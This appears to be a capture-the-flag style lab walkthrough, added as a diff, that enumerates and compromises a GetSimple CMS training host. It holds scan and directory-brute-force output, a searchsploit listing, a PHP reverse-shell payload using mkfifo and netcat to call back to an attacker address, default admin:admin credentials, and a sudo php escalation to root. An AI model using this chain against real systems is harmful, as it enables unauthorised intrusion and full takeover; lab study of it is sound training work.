@@ -1,0 +1,306 @@
+$ nmap -sC -sV 10.129.42.249
+
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-27 21:06 BST
+Nmap scan report for 10.129.42.249
+Host is up (0.027s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 4c73a025f5fe817b822b3649a54dc85e (RSA)
+|   256 e1c056d052042f3cac9ae7b1792bbb13 (ECDSA)
+|_  256 523147140dc38e1573e3c424a23a1277 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Welcome to GetSimple! - gettingstarted
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+| http-robots.txt: 1 disallowed entry 
+|_/admin/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.08 seconds
+
+
+
+gobuster dir -u http://10.129.42.249/ --wordlist /usr/share/dirb/wordlists/common.txt
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.129.42.249/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2023/06/27 21:12:37 Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 278]
+/.htpasswd            (Status: 403) [Size: 278]
+/admin                (Status: 301) [Size: 314] [--> http://10.129.42.249/admin/]
+/backups              (Status: 301) [Size: 316] [--> http://10.129.42.249/backups/]
+/.htaccess            (Status: 403) [Size: 278]                                    
+/data                 (Status: 301) [Size: 313] [--> http://10.129.42.249/data/]   
+/index.php            (Status: 200) [Size: 5485]                                   
+/plugins              (Status: 301) [Size: 316] [--> http://10.129.42.249/plugins/]
+/robots.txt           (Status: 200) [Size: 32]                                     
+/server-status        (Status: 403) [Size: 278]                                    
+/sitemap.xml          (Status: 200) [Size: 431]                                    
+/theme                (Status: 301) [Size: 314] [--> http://10.129.42.249/theme/]  
+                                                                                   
+===============================================================
+2023/06/27 21:12:39 Finished
+===============================================================
+
+
+curl http://10.129.42.249/robots.txt
+User-agent: *
+Disallow: /admin/ <!-- Go to url/admin/ enter credentials admin:admin -->
+<!-- Go to line 277 -->
+
+
+curl http://10.129.42.249/index.php
+<!DOCTYPE html>
+<!--[if lt IE 7 ]> <html lang="en" class="ie6"> <![endif]-->
+<!--[if IE 7 ]>    <html lang="en" class="ie7"> <![endif]-->
+<!--[if IE 8 ]>    <html lang="en" class="ie8"> <![endif]-->
+<!--[if IE 9 ]>    <html lang="en" class="ie9"> <![endif]-->
+<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en" > <!--<![endif]-->
+<head>
+<meta charset="utf-8">
+
+  <title>Welcome to GetSimple! - gettingstarted</title>
+	
+	<meta name="robots" content="index, follow">
+
+	<link href='//fonts.googleapis.com/css?family=Yanone+Kaffeesatz' rel='stylesheet' type='text/css'>
+	<link href="http://gettingstarted.htb/theme/Innovation/assets/css/reset.css" rel="stylesheet">
+	<link href="http://gettingstarted.htb/theme/Innovation/style.css?v=3.3.15" rel="stylesheet">
+	
+	<!--[if lt IE 9]>
+		<script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+	<![endif]--> 
+	
+	<!--[if lt IE 7 ]>
+    <script src="http://gettingstarted.htb/theme/Innovation/assets/js/dd_belatedpng.js"></script>
+    <script> DD_belatedPNG.fix('img, .png_bg'); //fix any <img> or .png_bg background-images </script>
+  <![endif]-->
+
+	<meta name="keywords" content="getsimple, easy, content management system" />
+<link rel="canonical" href="http://gettingstarted.htb/" />
+	
+</head> 
+<body id="index" >
+	
+	<!-- site header -->
+	<header>
+		<div class="header">
+			<div class="wrapper">
+				
+				<!-- logo/sitename -->
+				<a href="http://gettingstarted.htb/" id="logo" >gettingstarted</a>
+				
+				<!-- main navigation -->
+				<nav id="main-nav">
+					<ul>
+						<li class="index current active"><a href="http://gettingstarted.htb/" title="Welcome to GetSimple!">Home</a></li>
+					</ul>
+				</nav>
+			</div>
+		</div>
+		
+		<!-- breadcrumbs: only show when NOT on homepage -->
+		<p class="breadcrumbs" >
+			<span class="wrapper">
+				<a href="http://gettingstarted.htb/">Home</a> &nbsp;&nbsp;&#149;&nbsp;&nbsp;  <b>Welcome to GetSimple!</b>
+			</span>
+		</p>
+		
+  </header>	
+	<div class="wrapper clearfix">
+		<!-- page content -->
+		<article>
+			<section>
+				
+				<!-- title and content -->
+				<h1>Welcome to GetSimple!</h1>
+				<p>Thank you for using GetSimple CMS. This is your homepage, so please change this text to be what you want.</p>
+<ul>
+	<li><a href="http://get-simple.info/docs/">GetSimple CMS Documentation</a>
+		<ul>
+				<li><a href="http://get-simple.info/docs/theme-creation">How to Create a GetSimple Theme</a></li>
+		</ul>
+	</li>
+	<li><a href="http://get-simple.info/forums/">GetSimple Support Forums</a></li>
+</ul>
+<h2>Header 2</h2>
+<p>Lorem ipsum <em>dolor sit amet</em>, <strong>consectetur adipiscing elit</strong>. Donec <code>this is code</code> venenatis augue. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos. Integer vulputate pretium augue.</p>
+<h3>Header 3</h3>
+<pre><code class="language-css">#header h1 a { 
+	display: block; 
+	width: 300px; 
+	height: 80px; 
+}</code></pre>
+<h4>Header 4</h4>
+<ol>
+	<li>Lorem ipsum dolor sit amet</li>
+	<li>Consectetur adipiscing elit</li>
+	<li>Donec ut est risus, placerat venenatis augue</li>
+</ol>
+
+<blockquote>A blockquote. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Donec ut est risus, placerat venenatis augue. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos.</blockquote>
+				
+				<!-- page footer -->
+				<div class="footer">
+					<p>Published on <time datetime="2021-02-09" pubdate>February 9th, 2021</time></p>
+				</div>
+			</section>
+			
+		</article>
+		
+		<!-- include the sidebar template -->
+		<aside id="sidebar">
+
+	<div class="section" id="socialmedia" >
+		<h2>Connect</h2>
+		<div class="icons">
+						
+			<img src="http://gettingstarted.htb/theme/Innovation/assets/images/break.png" />
+			
+			<!-- addthis popup - you can add your username if you want analytics: http://www.addthis.com/help/customizing-addthis -->
+			<div class="addthis_toolbox" style="display:inline;width:24px;" >
+				<a href="//www.addthis.com/bookmark.php?v=250" class="addthis_button_compact"><img src="http://gettingstarted.htb/theme/Innovation/assets/images/share.png" /></a>
+			</div>
+			<script type="text/javascript" src="//s7.addthis.com/js/250/addthis_widget.js"></script>
+		</div>
+	</div>
+	
+	
+	<!-- wrap each sidebar section like this -->
+	<div class="section">
+		<h2>GetSimple Features</h2>
+<ul> 
+<li>XML based data storage</li> 
+<li>Best-in-Class User Interface</li> 
+<li>'Undo' protection &amp; backups</li> 
+<li>Easy to theme</li> 
+<li>Great documentation</li> 
+<li>Growing community</li> 
+</ul>
+<p>This is your sidebar text. Please change me in <em>Theme -> Edit Components</em></p>
+<p><a href="http://get-simple.info/download/">Download the Latest GetSimple</a></p>	</div>
+
+	
+</aside>
+	</div>
+
+<!-- include the footer template -->
+
+	<!-- site footer -->
+	<footer class="clearfix" >
+		
+				
+		<!-- 
+			Theme Credits
+			Please consider keeping the links to the developer and GetSimple if you use this theme
+		-->
+	 	<div class="wrapper">
+			<div class="left">2023 <a href="http://gettingstarted.htb/" >gettingstarted</a></div>
+			<div class="right">Innovation Theme by <a href="http://www.cagintranet.com" >Cagintranet</a> &middot; <a href="http://get-simple.info/" target="_blank" >Powered by  GetSimple</a></div>
+		</div>
+	</footer>
+	 
+</body>
+</html>
+
+
+
+curl http://10.129.42.249/sitemap.xml
+<?xml version="1.0" encoding="UTF-8"?>
+<urlset xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd" xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"><url><loc>http://gettingstarted.htb/</loc><lastmod>2021-02-09T09:53:11+00:00</lastmod><changefreq>weekly</changefreq><priority>1.0</priority></url></urlset>
+
+
+curl -s  http://10.129.42.249/sitemap.xml | xmllint --format -
+<?xml version="1.0" encoding="UTF-8"?>
+<urlset xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">
+  <url>
+    <loc>http://gettingstarted.htb/</loc>
+    <lastmod>2021-02-09T09:53:11+00:00</lastmod>
+    <changefreq>weekly</changefreq>
+    <priority>1.0</priority>
+  </url>
+</urlset>
+
+
+whatweb http://10.129.42.249/
+http://10.129.42.249/ [200 OK] AddThis, Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.42.249], Script[text/javascript], Title[Welcome to GetSimple! - gettingstarted]
+
+
+
+
+searchsploit getsimple
+------------------------------------------------------------- ---------------------------------
+ Exploit Title                                               |  Path
+------------------------------------------------------------- ---------------------------------
+Getsimple CMS 2.01 - 'changedata.php' Cross-Site Scripting   | php/webapps/34789.html
+Getsimple CMS 2.01 - 'components.php' Cross-Site Scripting   | php/webapps/34041.txt
+Getsimple CMS 2.01 - Local File Inclusion                    | php/webapps/12517.txt
+Getsimple CMS 2.01 - Multiple Vulnerabilities                | php/webapps/14338.html
+Getsimple CMS 2.01 < 2.02 - Administrative Credentials Discl | php/webapps/15605.txt
+Getsimple CMS 2.03 - 'upload-ajax.php' Arbitrary File Upload | php/webapps/35353.txt
+Getsimple CMS 3.0 - 'set' Local File Inclusion               | php/webapps/35726.py
+Getsimple CMS 3.1.2 - 'path' Local File Inclusion            | php/webapps/37587.txt
+Getsimple CMS 3.2.1 - Arbitrary File Upload                  | php/webapps/25405.txt
+GetSimple CMS 3.3.1 - Cross-Site Scripting                   | php/webapps/43888.txt
+Getsimple CMS 3.3.1 - Persistent Cross-Site Scripting        | php/webapps/32502.txt
+Getsimple CMS 3.3.10 - Arbitrary File Upload                 | php/webapps/40008.txt
+GetSimple CMS 3.3.13 - Cross-Site Scripting                  | php/webapps/44408.txt
+GetSimple CMS 3.3.16 - Persistent Cross-Site Scripting       | php/webapps/49726.py
+GetSimple CMS 3.3.16 - Persistent Cross-Site Scripting (Auth | php/webapps/48850.txt
+GetSimple CMS 3.3.4 - Information Disclosure                 | php/webapps/49928.py
+GetSimple CMS Custom JS 0.1 - Cross-Site Request Forgery     | php/webapps/49816.py
+Getsimple CMS Items Manager Plugin - 'PHP.php' Arbitrary Fil | php/webapps/37472.php
+GetSimple CMS My SMTP Contact Plugin 1.1.1 - Cross-Site Requ | php/webapps/49774.py
+GetSimple CMS My SMTP Contact Plugin 1.1.2 - Persistent Cros | php/webapps/49798.py
+GetSimple CMS Plugin Multi User 1.8.2 - Cross-Site Request F | php/webapps/48745.txt
+GetSimpleCMS - Unauthenticated Remote Code Execution (Metasp | php/remote/46880.rb
+------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+searchsploit -u <!-- Update -->
+
+searchsploit -m (file/path) <!-- Copy exploit to current working directory -->
+
+
+<!-- See line 61 -->
+<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>
+<!-- insert text into Themes page and save to execute, then from terminal: -->
+nc -lvnp 9443
+
+sudo -l
+Matching Defaults entries for www-data on gettingstarted:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on gettingstarted:
+    (ALL : ALL) NOPASSWD: /usr/bin/php
+
+<!-- You can also obtain reverse shell using metasploit -->
+<!-- after obtaining reverse shell use: sudo -l /This will show permissions of executable files -->
+sudo -l
+Matching Defaults entries for www-data on gettingstarted:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on gettingstarted:
+    (ALL : ALL) NOPASSWD: /usr/bin/php
+<!-- php files may be executed with root authorization -->
+<!-- Go to GTFOBins, search for php, and then search for sudo you'll find the following command:  -->
+CMD="/bin/sh"<!-- Press enter -->
+sudo php -r "system('$CMD');"
+<!-- You have obtained root access -->
+whoami
+root
+
+
+
